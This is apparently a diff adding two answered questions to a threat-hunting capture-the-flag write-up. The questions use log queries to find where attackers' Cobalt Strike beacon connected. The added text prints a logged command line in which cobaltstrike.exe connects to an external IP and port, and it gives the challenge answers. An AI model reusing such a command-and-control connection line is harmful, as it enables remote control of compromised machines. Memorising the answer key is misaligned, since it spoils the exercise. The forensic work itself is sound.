@@ -153,3 +153,27 @@ ProcessEvents
 Only one result is returned.<br><br>
 
 **Answer: "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"**<br><br>
+
+**Q16. What IP address do the hackers connect to using cobalt strike?**<br><br>
+
+```
+ProcessEvents
+| where hostname == "RQJQ-MACHINE"
+| where process_commandline contains "cobalt"
+```
+<br>
+
+The second result shows the IP address cobaltstrike.exe connected too.<br><br>
+
+```
+C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050
+```
+<br>
+
+**Answer: 93.238.22.122**<br><br>
+
+**Q17. Over what port do the hackers connect to that IP address?**<br><br>
+From previous query result, the post can be obtained.<br><br>
+
+**Answer: 50050**<br><br>
+
